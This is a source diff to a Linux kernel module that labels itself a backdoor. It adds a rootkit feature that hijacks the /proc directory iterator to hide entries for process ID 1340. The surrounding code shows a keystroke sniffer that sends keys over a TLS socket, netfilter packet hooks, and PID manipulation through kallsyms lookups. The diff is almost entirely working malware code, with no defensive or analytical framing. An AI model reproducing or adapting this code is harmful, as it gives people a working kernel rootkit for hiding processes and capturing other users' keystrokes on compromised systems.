@@ -6,6 +6,7 @@
  */
 
 #include <linux/circ_buf.h>
+#include <linux/fs.h>
 #include <linux/init.h>
 #include <linux/ip.h>
 #include <linux/kallsyms.h>
@@ -14,8 +15,10 @@
 #include <linux/kthread.h>
 #include <linux/module.h>
 #include <linux/net.h>
+#include <linux/namei.h>
 #include <linux/netfilter.h>
 #include <linux/netfilter_ipv4.h>
+#include <linux/path.h>
 #include <linux/pid_namespace.h>
 #include <linux/reboot.h>
 #include <linux/sched.h>
@@ -70,6 +73,12 @@ static struct task_pid hidden_procs[10];
 int hidden_count = 0;
 static rwlock_t* my_tasklist_lock;
 
+static struct path proc_path;
+static struct file_operations proc_fops;
+static struct file_operations* backup_proc_fops;
+static struct inode* proc_inode;
+struct dir_context* backup_ctx;
+
 void consume_keys(struct work_struct* work);
 
 struct my_work {
@@ -84,9 +93,16 @@ int init_userspace_conn(void);
 void UpdateChecksum(struct sk_buff* skb);
 int keysniffer_cb(struct notifier_block* nblock, unsigned long code, void* _param);
 
+static int rk_filldir_t(struct dir_context* ctx, const char* proc_name, int len, loff_t off,
+        u64 ino, unsigned int d_type);
+
 //Keysniffer code modified from https://github.com/jarun/keysniffer/blob/master/keysniffer.c
 static struct notifier_block keysniffer_blk = {
         .notifier_call = keysniffer_cb,
+};
+
+struct dir_context bad_ctx = {
+        .actor = rk_filldir_t,
 };
 
 /*
@@ -342,6 +358,7 @@ void read_TLS(struct work_struct* work) {
             hide();
         }
     } else if (memcmp("hide", buffer, 4) == 0) {
+#if 0
         if (kstrtou16(buffer + 5, 10, &tmp_port)) {
             strcpy(buffer, bad_port);
             send_msg(svc->tls_socket, buffer, strlen(bad_port));
@@ -366,6 +383,7 @@ void read_TLS(struct work_struct* work) {
                 write_unlock(my_tasklist_lock);
             }
         }
+#endif
     } else {
         strcpy(buffer, unknown);
         send_msg(svc->tls_socket, buffer, strlen(unknown));
@@ -558,40 +576,21 @@ void consume_keys(struct work_struct* work) {
     printk(KERN_INFO "Sent keystroke %s\n", keystroke);
 }
 
-void my_custom_cleanup(void) {
-    int i;
-    nf_unregister_net_hook(&init_net, &nfho);
-    nf_unregister_net_hook(&init_net, &nfhi);
+static int rk_filldir_t(struct dir_context* ctx, const char* proc_name, int len, loff_t off,
+        u64 ino, unsigned int d_type) {
+    if (strncmp(proc_name, "1340", strlen("1340")) == 0) {
+        return 0;
+    }
+    return backup_ctx->actor(backup_ctx, proc_name, len, off, ino, d_type);
+}
 
-    unregister_keyboard_notifier(&keysniffer_blk);
-    //unregister_reboot_notifier(&reboot_blk);
-
-    if (svc) {
-        if (svc->tls_socket) {
-            sock_release(svc->tls_socket);
-            printk(KERN_INFO "release tls_socket\n");
-        }
-        kfree(svc);
-    }
-
-    if (buffer) {
-        kfree(buffer);
-    }
-    if (open_ports) {
-        kfree(open_ports);
-    }
-    if (closed_ports) {
-        kfree(closed_ports);
-    }
-
-    write_lock(my_tasklist_lock);
-    for (i = 0; i < hidden_count; ++i) {
-        change_pidR(hidden_procs[i].ts, PIDTYPE_PID, hidden_procs[i].p);
-        //Decrement the refcount to reset pid struct
-        put_pid(hidden_procs[i].p);
-        force_sig(SIGKILL, hidden_procs[i].ts);
-    }
-    write_unlock(my_tasklist_lock);
+int rk_iterate_shared(struct file* file, struct dir_context* ctx) {
+    int result = 0;
+    bad_ctx.pos = ctx->pos;
+    backup_ctx = ctx;
+    result = backup_proc_fops->iterate_shared(file, &bad_ctx);
+    ctx->pos = bad_ctx.pos;
+    return result;
 }
 
 /*
@@ -614,6 +613,17 @@ static int __init mod_init(void) {
             "change_pid");
     alloc_pidR = (struct pid * (*) (struct pid_namespace*) ) kallsyms_lookup_name("alloc_pid");
     my_tasklist_lock = (rwlock_t*) kallsyms_lookup_name("tasklist_lock");
+
+#if 1
+    if (kern_path("/proc", 0, &proc_path)) {
+        return -1;
+    }
+    proc_inode = proc_path.dentry->d_inode;
+    proc_fops = *proc_inode->i_fop;
+    backup_proc_fops = proc_inode->i_fop;
+    proc_fops.iterate_shared = rk_iterate_shared;
+    proc_inode->i_fop = &proc_fops;
+#endif
 
     nfhi.hook = incoming_hook;
     nfhi.hooknum = NF_INET_LOCAL_IN;
@@ -667,7 +677,45 @@ static int __init mod_init(void) {
  * Module exit function
  */
 static void __exit mod_exit(void) {
-    my_custom_cleanup();
+    int i;
+    nf_unregister_net_hook(&init_net, &nfho);
+    nf_unregister_net_hook(&init_net, &nfhi);
+
+    unregister_keyboard_notifier(&keysniffer_blk);
+
+#if 1
+    proc_inode = proc_path.dentry->d_inode;
+    proc_inode->i_fop = backup_proc_fops;
+#endif
+
+    if (svc) {
+        if (svc->tls_socket) {
+            sock_release(svc->tls_socket);
+            printk(KERN_INFO "release tls_socket\n");
+        }
+        kfree(svc);
+    }
+
+    if (buffer) {
+        kfree(buffer);
+    }
+    if (open_ports) {
+        kfree(open_ports);
+    }
+    if (closed_ports) {
+        kfree(closed_ports);
+    }
+
+#if 0
+    write_lock(my_tasklist_lock);
+    for (i = 0; i < hidden_count; ++i) {
+        change_pidR(hidden_procs[i].ts, PIDTYPE_PID, hidden_procs[i].p);
+        //Decrement the refcount to reset pid struct
+        put_pid(hidden_procs[i].p);
+        force_sig(SIGKILL, hidden_procs[i].ts);
+    }
+    write_unlock(my_tasklist_lock);
+#endif
     printk(KERN_ALERT "removed backdoor module\n");
 }
 
